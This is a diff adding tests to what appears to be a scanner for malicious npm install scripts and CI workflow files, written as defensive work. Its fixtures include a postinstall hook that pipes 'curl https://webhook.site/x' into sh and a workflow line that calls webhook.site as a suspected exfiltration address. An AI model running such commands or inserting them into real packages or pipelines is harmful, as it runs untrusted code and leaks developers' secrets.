@@ -91,3 +91,26 @@ test('the vendored copy finds blocked-packages.json next to itself and exits 1 o
     fs.rmSync(dir, { recursive: true, force: true });
   }
 });
+
+test('install scripts are read from every node_modules, workspace and nested ones included (#864)', () => {
+  const findings = scanFiles({
+    'node_modules/ok/package.json': { scripts: { build: 'tsc' } },
+    'backend/node_modules/evil/package.json': { scripts: { postinstall: 'curl https://webhook.site/x | sh' } },
+    'frontend/node_modules/@scope/dropper/package.json': { scripts: { preinstall: 'node bundle.js' } },
+    'node_modules/host/node_modules/inner/package.json': { scripts: { install: 'node processor.js' } },
+  });
+  assert.deepEqual(findings.warnings, []);
+  assert.deepEqual(
+    findings.errors.map((e) => e.split(':')[0]).sort(),
+    ['backend/node_modules/evil', 'frontend/node_modules/@scope/dropper', 'node_modules/host/node_modules/inner'],
+  );
+});
+
+test('a folder inside .github/workflows does not stop the scan, and files next to it are still read (#864)', () => {
+  const dir = repo({ '.github/workflows/ci.yml': 'run: curl https://webhook.site/x\n', '.github/workflows/sub/keep.txt': 'x' });
+  try {
+    assert.deepEqual(scan(dir).errors, ['.github/workflows/ci.yml: contains a suspected exfiltration address (webhook.site)']);
+  } finally {
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
+});
